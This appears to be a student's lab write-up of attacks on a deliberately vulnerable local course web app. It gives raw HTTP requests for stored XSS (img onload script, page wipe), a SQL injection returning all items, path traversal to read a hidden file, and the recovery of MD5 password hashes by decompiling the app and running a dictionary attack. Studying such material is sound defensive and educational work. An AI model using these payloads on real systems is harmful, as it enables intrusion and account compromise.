@@ -1,0 +1,142 @@
+Visit https://nekomiya.notion.site/335-A6-Report-877286d21a1b4452a4c1bfcf2385426e for full report.
+
+Blocks starting with '>' are requests.
+
+>>>> N01
+
+Firstly, we noticed that HTML tags are not completely escaped in Comment Page (Book), and authentication is not performed when posting comments. That reveals XSS attack possibility, for example, since comments are simply surrounded by <p></p> , hence if we post a comment </p> the leading <p> will be totally closed in advance, and the format of comment section will be corrupted [img: https://s3.us-west-2.amazonaws.com/secure.notion-static.com/dd74ac55-9024-4f39-8bef-c208288ca70f/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20221016%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20221016T050354Z&X-Amz-Expires=86400&X-Amz-Signature=bba36a6f89d53f6aa27e2ad09fa8380402993a2650d221620ba2d1c6fa0ae00b&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject].
+
+> POST /api/Comment HTTP/1.1
+> Host: localhost:5001
+> User-Agent: curl/7.84.0
+> accept: text/plain
+> Content-Type: application/json
+> Content-Length: 48
+> Body: { "comment": "</p></br></br>", "name": "<br/>" }
+
+<<<<
+
+>>>> N02
+
+Similarly, if we post a comment <img src="..."></img> , an image will be shown. [img: https://s3.us-west-2.amazonaws.com/secure.notion-static.com/a37bae01-8aff-415f-922e-07976335ab82/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20221016%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20221016T050452Z&X-Amz-Expires=86400&X-Amz-Signature=a3519bf34db1439a60c0e290ec33c659e7df66fa4cee916b4c9959de9f393d58&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject]
+
+> POST /api/Comment HTTP/1.1
+> Host: localhost:5001
+> User-Agent: curl/7.84.0
+> accept: text/plain
+> Content-Type: application/json
+> Content-Length: 120
+> Body: { "comment": "<img src=\"https://pom-official.jp/wp-content/uploads/1612756782-878x1024.png\"></img>", "name": "<br/>" }
+
+<<<<
+
+>>>> N03
+
+Not to mention that we post a comment containing <script> tags or just put it in attributes - evil things may be executed. 
+
+Example 1:
+
+> POST /api/Comment HTTP/1.1
+> Host: localhost:5001
+> User-Agent: curl/7.84.0
+> accept: text/plain
+> Content-Type: application/json
+> Content-Length: 142
+> Body: { "comment": "<img src=\"https://animemiru.jp/wp-content/uploads/2018/06/nonnonbiyori-komari-17.jpg\" onload=\"alert(1)\">", "name": "<br/>" }
+
+As we can see, scripts in onload attribute of this image is executed and an unexpected alert is popped out. [img: https://s3.us-west-2.amazonaws.com/secure.notion-static.com/26f05ee5-2ce4-44ce-8484-8b3a1eca7832/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20221016%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20221016T051021Z&X-Amz-Expires=86400&X-Amz-Signature=6494ec2ca32b39e259292b1de54593272abe0d38eb29390e92cb01d39a74b910&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject]
+
+Example 2:
+
+> POST /api/Comment HTTP/1.1
+> Host: localhost:5001
+> User-Agent: curl/7.84.0
+> accept: text/plain
+> Content-Type: application/json
+> Content-Length: 159
+> Body: { "comment": "<img src=\"https://cdn.sstatic.net/Sites/stackoverflow/img/sprites.svg?v=1b3cdae197be\" onload=\"document.body.innerHTML=1\">
+
+We can even clear the whole page. [img: https://s3.us-west-2.amazonaws.com/secure.notion-static.com/35ff7725-1a63-472e-a47e-2106a6843c8b/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20221016%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20221016T051031Z&X-Amz-Expires=86400&X-Amz-Signature=2f5ad31f38ddb176d1159c9fd7450316e3e7fe3e3895929720687130324bcd3c&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject]
+
+<<<< 
+
+>>>> N04
+
+Note that the server provides a filtering interface for shop items: /api/Items/{term} , this remind us the possibility of executing SQL injection, since it is very likely implemented by a database together with SQL queries containing WHERE keywords. We’d verify this here.
+
+> GET /api/Items/clock%27%20or%201%3D1%20or%27 HTTP/1.1
+> Host: localhost:5001
+> User-Agent: curl/7.84.0
+> accept: text/plain
+
+All items will be returned.
+
+<<<< 
+
+
+
+>>>> C01
+
+Answer: Carola
+
+
+Note that at the root path of `GasCk-294856075`. there’s a file named `GameAcademy.sqlite`. we can infer that this is the database of our server and it is stored locally by SQLite, open it with DB Browser for SQLite, we can see 4 tables:
+
+- Comments
+- GameData
+- Products
+- Users
+
+> SELECT * FROM Users
+
+Hence we can find the other user’s name: `Carola`, in table `Users`
+
+<<<<
+
+>>>> C02
+
+Answer: partial
+
+
+We already know that the password for `jbon007` is `jbon007passwd` , and we need to know the Hash Algorithm and the mapping between password and its hash string.
+
+Let’s disassemble `GameAcademy.dll` with `ILSpy`, luckily, a `pdb` file is distributed together with the server.
+
+the first screenshot shows the entrance of authentication, note there’s a line saying
+
+string passwordHash = GetMD5Hash(username, password);
+
+keyword `MD5` suggests that the encyption method is MD5, and it makes uses of both username and password.
+
+let’s dive into `GetMD5Hash` method, which is shown in the second screenshot, then we could find
+
+sb.AppendFormat((j == input.Length - 1) ? "{0}" : "{0}:", s);
+
+hence it can be derived that the MD5 Hash is computed from the string of form `username:password`. By transversing Oxford Dictionary, and comparing MD5 Hashes, the answer is found. see report for details.
+
+<<<< 
+
+>>>> C03
+
+we can notice that about the file path, no extra filter is applied and is combined to full path as is. The images are place in `ItemsImages` 
+In folder `HugeImages`, there is an image called `chawesootha.svg`, we’re going to fetch it using relative path: `(ItemsImages/)../HugeImages/chawesootha`
+encode into url: `..%2FHugeImages%2Fchawesootha`
+
+> GET /api/ItemPhoto/..%2FHugeImages%2Fchawesootha HTTP/1.1
+> Host: localhost:5001
+> User-Agent: curl/7.84.0
+> accept: image/*
+
+Response 
+
+< HTTP/1.1 200 OK
+< Content-Length: 7992
+< Content-Type: image/svg+xml
+< Date: Sun, 16 Oct 2022 05:15:46 GMT
+< Server: Kestrel
+< Access-Control-Allow-Origin: *
+<
+{ [7992 bytes data]
+100  7992  100  7992    0     0   276k      0 --:--:-- --:--:-- --:--:--  289k
+
+<<<< 
